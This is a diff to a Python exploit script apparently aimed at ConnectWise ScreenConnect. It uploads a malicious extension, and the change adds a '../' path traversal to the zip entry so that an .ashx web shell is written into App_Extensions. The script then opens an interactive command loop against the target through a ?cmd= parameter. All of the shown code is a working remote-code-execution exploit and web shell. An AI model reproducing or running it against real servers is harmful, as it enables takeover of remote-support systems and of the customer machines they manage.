@@ -92,7 +92,7 @@ public class {payload_handler_class} : IHttpHandler
 </ExtensionManifest>'''
     zip_resources = zipfile.ZipFile("resources.zip", 'w')
     zip_resources.writestr(f"{plugin_guid}/Manifest.xml", manifest_data)
-    zip_resources.writestr(f"{plugin_guid}/{payload_ashx}", payload_data)
+    zip_resources.writestr(f"{plugin_guid}/../{payload_ashx}", payload_data)
     zip_resources.close()
 
 def UploadExtension(url, anti_forgery_token):
@@ -117,9 +117,9 @@ def UploadExtension(url, anti_forgery_token):
 
 def ExecuteCommand(url):
     try:
-        resp = session.get(url=url + f"/App_Extensions/{plugin_guid}/{payload_ashx}", headers=exploit_header, verify=False, proxies=proxy)
+        resp = session.get(url=url + f"/App_Extensions/{payload_ashx}", headers=exploit_header, verify=False, proxies=proxy)
         if resp.status_code == 200:
-            print(f"[+] Shell Url: {url + f'/App_Extensions/{plugin_guid}/{payload_ashx}'}")
+            print(f"[+] Shell Url: {url + f'/App_Extensions/{payload_ashx}'}")
             print("[+] Please start executing commands freely! Type <quit> to delete the shell")
             while True:
                 cmd = input(f"{GREEN}command > {RESET}")
@@ -127,12 +127,12 @@ def ExecuteCommand(url):
                     DeleteExtension(target, plugin_guid)
                     sys.exit(0)
                 try:
-                    resp = session.get(url=url + f"/App_Extensions/{plugin_guid}/{payload_ashx}?cmd={cmd}", headers=exploit_header, verify=False, proxies=proxy)
+                    resp = session.get(url=url + f"/App_Extensions/{payload_ashx}?cmd={cmd}", headers=exploit_header, verify=False, proxies=proxy)
                     print(resp.text)
                 except Exception as err:
                     print("[-] Error in func <ExecuteCommand>, error message: " + str(err))
         else:
-            print(f"[-] Malicious extension load error ({url + f'/App_Extensions/{plugin_guid}/{payload_ashx}'}), Refer to https://www.connectwise.com/globalassets/media/documents/connectwisecontrolsecurityevaluationmatrix.pdf")
+            print(f"[-] Malicious extension load error ({url + f'/App_Extensions/{payload_ashx}'}), Refer to https://www.connectwise.com/globalassets/media/documents/connectwisecontrolsecurityevaluationmatrix.pdf")
             DeleteExtension(target, plugin_guid)
     except Exception as err:
         print("[-] Error in func <ExecuteCommand>, error message: " + str(err))
